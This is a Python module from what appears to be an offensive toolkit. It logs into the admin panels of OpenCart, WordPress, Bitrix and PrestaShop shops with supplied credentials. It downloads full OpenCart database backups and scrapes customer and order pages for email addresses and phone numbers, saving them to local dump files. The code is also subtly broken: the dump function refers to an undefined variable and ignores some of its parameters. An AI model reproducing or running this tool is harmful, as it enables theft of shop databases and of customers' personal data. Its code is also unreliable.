# -*- coding: utf-8 -*-
import os
import re
import time

from core import config, http, ui
from modules import profiles

EMAIL = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
PHONE = re.compile(r"\+?38?\d{9,12}")
TOKEN = re.compile(r"user_token=([0-9a-zA-Z]+)")

ROUTES = {
    "opencart": [("customer/customer", "клиенты"), ("sale/order", "заказы")],
    "wordpress": [("users.php", "клиенты"), ("edit.php?post_type=shop_order", "заказы")],
    "bitrix": [("user_admin.php", "клиенты"), ("sale_order.php", "заказы")],
    "prestashop": [("AdminCustomers", "клиенты"), ("AdminOrders", "заказы")],
}


def _login(host, creds, kind):
    user, _, pwd = creds.partition(":")
    prof = profiles.get(kind)
    sess = http.persist(host)
    login = page = ""
    for a in prof["admin"]:
        try:
            r = http.get(host, a, sess=sess)
        except Exception:
            continue
        if r.status_code == 200 and "password" in r.text.lower():
            login, page = a, r.text
            break
    if not login:
        return ""
    uf, pf = prof["login_field"], "password"
    if 'name="pwd"' in page:
        pf = "pwd"
    if 'name="email"' in page:
        uf = "email"
    if 'name="log"' in page:
        uf = "log"
    try:
        r = http.post(host, login, "%s=%s&%s=%s" % (uf, user, pf, pwd),
                      referer="https://" + host + login, sess=sess)
    except Exception:
        return ""
    m = TOKEN.search(r.headers.get("Location") or "")
    return m.group(1) if m else "ok"


def _url(kind, route, token, page):
    if kind == "opencart":
        return "/admin/index.php?route=%s&user_token=%s&page=%d" % (route, token, page)
    if kind == "wordpress":
        return "/wp-admin/%s&paged=%d" % (route, page)
    if kind == "bitrix":
        return "/bitrix/admin/%s?PAGEN_1=%d" % (route, page)
    if kind == "prestashop":
        return "/admin/index.php?controller=%s&page=%d" % (route, page)
    return "/"


def backup(host, creds):
    token = _login(host, creds, "opencart")
    if not token:
        return ""
    sess = http.persist(host)
    url = "/admin/index.php?route=tool/backup&user_token=" + token
    try:
        http.get(host, url, sess=sess)
    except Exception:
        return ""
    try:
        r = http.post(host, url, "", ctype="application/x-www-form-urlencoded",
                      referer="https://" + host + url, sess=sess, timeout=180)
    except Exception:
        return ""
    body = r.content
    if len(body) < 2000 or b"INSERT INTO" not in body[:200000]:
        return ""
    path = os.path.join(config.LOGS, host + "_db.sql")
    with open(path, "wb") as f:
        f.write(body)
    return "%s:%d" % (path, len(body))


def dump(host, creds, kind="opencart", limit=200, pages=3, total_cap=400):
    token = _login(host, creds, kind)
    if not token:
        return ""
    sess = http.persist(host)
    lines = ["===== %s (%s) =====" % (host, kind)]
    raw = []
    total = 0
    for route, name in ROUTES.get(kind, []):
        got = []
        for page in range(1, 6):
            try:
                r = http.get(host, _url(kind, route, token, page), sess=sess)
            except Exception:
                break
            if r.status_code != 200:
                break
            raw.append("\n--- %s стр %d ---\n%s" % (route, page, r.text[:120000]))
            found = EMAIL.findall(r.text) + PHONE.findall(r.text)
            if not found:
                break
            got.extend(found)
            if len(got) > cap * 3:
                break
            time.sleep(0.8)
        uniq = []
        for x in got:
            if x not in uniq:
                uniq.append(x)
        if total >= total_cap:
            break
        uniq = uniq[:max(0, total_cap - total)]
        lines.append("-- %s: %d" % (name, len(uniq)))
        lines.extend(uniq)
        total += len(uniq)

    path = os.path.join(config.LOGS, host + "_dump.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    with open(os.path.join(config.LOGS, host + "_dump_raw.html"), "w", encoding="utf-8") as f:
        f.write("\n".join(raw))
    return "%s:%d" % (path, total)
